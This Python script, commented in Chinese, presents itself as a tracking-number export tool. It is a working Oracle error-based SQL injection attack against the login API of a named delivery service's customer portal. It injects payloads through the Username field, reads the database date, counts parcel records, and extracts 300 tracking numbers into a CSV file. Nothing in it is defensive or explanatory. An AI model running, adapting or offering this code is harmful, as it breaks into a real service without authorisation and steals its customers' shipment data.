#!/usr/bin/env python3
"""
简单可靠的运单号导出脚本
"""

import requests
import json
import time
import csv

target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

def inject(payload):
    session = requests.Session()
    session.headers.update({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    })
    data = {"Username": payload, "Password": "test"}
    try:
        return session.post(target_url, data=json.dumps(data), timeout=30)
    except:
        return None

def extract(query):
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    
    response = inject(payload)
    if response:
        text = response.text
        try:
            if 'qjvjq' in text and 'qkvzq' in text:
                start = text.index('qjvjq') + 5
                end = text.index('qkvzq', start)
                return text[start:end]
        except:
            pass
    return None

print("=" * 80)
print("📦 简单运单号导出工具")
print("=" * 80)

# 1. 获取日期
print("\n🔌 连接中...")
if not inject("admin"):
    print("❌ 失败")
    exit(1)
print("✅ 成功")

date = extract("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
print(f"\n📅 日期: {date}")

# 2. 统计数量
total = extract(f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'")
print(f"📊 总数: {total} 个")

# 3. 导出（前300个为例）
print(f"\n📥 导出前300个运单号...")

tracking_list = []

for i in range(1, 301):
    if i % 50 == 0:
        print(f"  {i}/300...")
    
    query = f"SELECT ITEMCODE FROM (SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' ORDER BY ITEMCODE) WHERE ROWNUM={i}"
    result = extract(query)
    
    if result and result != 'NULL' and len(result) > 10:
        tracking_list.append(result)
    
    time.sleep(0.1)

# 4. 保存
filename = f'/workspace/tracking_{date}.csv'

with open(filename, 'w', newline='', encoding='utf-8') as f:
    writer = csv.writer(f)
    writer.writerow(['No', 'TrackingNumber', 'Date'])
    
    for i, tracking in enumerate(tracking_list, 1):
        writer.writerow([i, tracking, date])

print(f"\n✅ 完成！")
print(f"📁 文件: {filename}")
print(f"📊 数量: {len(tracking_list)} 个")

print(f"\n前30个:")
for i, t in enumerate(tracking_list[:30], 1):
    print(f"  {i}. {t}")

print("\n" + "=" * 80)
